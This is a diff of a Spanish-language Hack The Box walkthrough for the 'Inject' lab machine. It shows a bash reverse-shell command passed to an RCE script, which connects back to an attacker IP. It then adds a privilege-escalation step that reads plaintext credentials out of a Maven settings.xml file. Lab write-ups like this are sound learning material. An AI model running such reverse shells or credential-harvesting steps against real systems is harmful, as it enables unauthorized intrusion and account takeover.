@@ -337,12 +337,47 @@ uid=1000(frank) gid=1000(frank) groups=1000(frank)
 
 Vamos a obtener una reverse shell con el siguiente comando:
 
-````bash
+```bash
 ❯ python3 rce.py -u http://10.129.228.213:8080 -c "bash -i >& /dev/tcp/10.10.15.143/8888 0>&1"
 ```
 
+# Escalada de privilegios
 
+Investigando un poco en el directorio `/home` de `frank`, encontramos las credenciaes de phil:
 
+```bash
+frank@inject:~$ ls -la
+total 28
+drwxr-xr-x 5 frank frank 4096 Feb  1  2023 .
+drwxr-xr-x 4 root  root  4096 Feb  1  2023 ..
+lrwxrwxrwx 1 root  root     9 Jan 24  2023 .bash_history -> /dev/null
+-rw-r--r-- 1 frank frank 3786 Apr 18  2022 .bashrc
+drwx------ 2 frank frank 4096 Feb  1  2023 .cache
+drwxr-xr-x 3 frank frank 4096 Feb  1  2023 .local
+drwx------ 2 frank frank 4096 Feb  1  2023 .m2
+-rw-r--r-- 1 frank frank  807 Feb 25  2020 .profile
+frank@inject:~$ cd .m2
+frank@inject:~/.m2$ ls
+settings.xml
+frank@inject:~/.m2$ cat settings.xml
+<?xml version="1.0" encoding="UTF-8"?>
+<settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
+  <servers>
+    <server>
+      <id>Inject</id>
+      <username>phil</username>
+      <password>DocPhillovestoInject123</password>
+      <privateKey>${user.home}/.ssh/id_dsa</privateKey>
+      <filePermissions>660</filePermissions>
+      <directoryPermissions>660</directoryPermissions>
+      <configuration></configuration>
+    </server>
+  </servers>
+</settings>
+```
+
+Probamos las credenciales `phil:DocPhillovestoInject123`.
 
 
 [Pwned!](https://labs.hackthebox.com/achievement/machine/1992274/513)
